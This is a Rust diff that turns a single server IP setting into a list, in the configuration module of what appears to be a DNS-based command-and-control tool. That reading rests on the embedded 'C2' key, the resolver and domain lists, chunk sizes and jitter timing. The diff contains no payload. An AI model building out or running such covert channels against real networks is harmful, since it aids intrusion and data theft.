@@ -9,7 +9,7 @@ pub struct Config {
     pub encryption_key: String,
     pub domains: Vec<String>,
     pub resolvers: Vec<String>,
-    pub server_ip: String,
+    pub server_ips: Vec<String>,
     pub chunk_bytes: usize,
     pub jitter_min_ms: u64,
     pub jitter_max_ms: u64,
@@ -25,7 +25,9 @@ struct FileConfig {
     domains: Vec<String>,
     #[serde(default)]
     resolvers: Vec<String>,
-    server_ip: String,
+    server_ip: Option<String>,
+    #[serde(default)]
+    server_ips: Vec<String>,
     chunk_bytes: usize,
     jitter_min_ms: u64,
     jitter_max_ms: u64,
@@ -41,7 +43,7 @@ static EMBEDDED: Lazy<Config> = Lazy::new(|| Config {
     encryption_key: "MySecretC2Key123!@#DefaultChange".to_string(),
     domains: vec!["example.com".to_string()],
     resolvers: vec![],
-    server_ip: "0.0.0.0".to_string(),
+    server_ips: vec!["0.0.0.0".to_string()],
     chunk_bytes: 180,
     jitter_min_ms: 1500,
     jitter_max_ms: 4000,
@@ -78,8 +80,8 @@ impl Config {
         &self.resolvers
     }
 
-    pub fn server_ip(&self) -> &str {
-        &self.server_ip
+    pub fn server_ips(&self) -> &[String] {
+        &self.server_ips
     }
 
     pub fn chunk_adjustment() -> Option<(usize, usize)> {
@@ -142,11 +144,21 @@ fn tune_chunk_bytes(mut cfg: Config) -> Config {
 
 impl From<FileConfig> for Config {
     fn from(value: FileConfig) -> Self {
+        let mut ips = value.server_ips;
+        if let Some(ip) = value.server_ip {
+            if !ips.contains(&ip) {
+                ips.push(ip);
+            }
+        }
+        if ips.is_empty() {
+            ips.push("0.0.0.0".to_string());
+        }
+
         Config {
             encryption_key: value.encryption_key,
             domains: value.domains,
             resolvers: value.resolvers,
-            server_ip: value.server_ip,
+            server_ips: ips,
             chunk_bytes: value.chunk_bytes,
             jitter_min_ms: value.jitter_min_ms,
             jitter_max_ms: value.jitter_max_ms,
